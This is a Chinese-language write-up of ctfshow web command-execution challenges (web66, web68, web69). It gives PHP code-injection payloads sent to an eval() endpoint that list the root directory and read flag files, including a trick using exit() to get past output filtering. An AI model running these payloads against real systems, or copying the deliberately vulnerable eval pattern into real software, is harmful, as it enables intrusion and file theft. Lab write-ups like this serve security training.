# ctfshow-web命令执行(web61-77;118-124)
[toc]

## web66 print\_r(scandir())与highlight\_file()
**题目描述**

```Plain Text
show_source('flag.php');
该语句被过滤
```
**题解**

POST传入c=print\_r(scandir('/'));

获得目录

```Plain Text
Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => dev [5] => etc [6] => flag.txt [7] => home [8] => lib [9] => media [10] => mnt [11] => opt [12] => proc [13] => root [14] => run [15] => sbin [16] => srv [17] => sys [18] => tmp [19] => usr [20] => var ) 
```
得知flag在flag.txt文件中

传入c=highlight\_file('flag.txt');可得flag(highlight函数可以显示文件得全部)

---
## web68 include
**题目描述**

```Plain Text
禁用highlight_file()
```
**解**

尝试include('/index.php'),提示传入的参数长度过大

尝试include('/flag.txt'),得到flag

---
## web69 exit()
```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```
传入c=include('/flag.txt');

获得

```php
???????: ?????_?????????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???_???() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????{????????-????-????-????-????????????} 你要上天吗？ 
```
flag被过滤

因此使用exit()函数让它停下

```php
payload:c=include('/flag.txt');exit(0);
```
得到flag



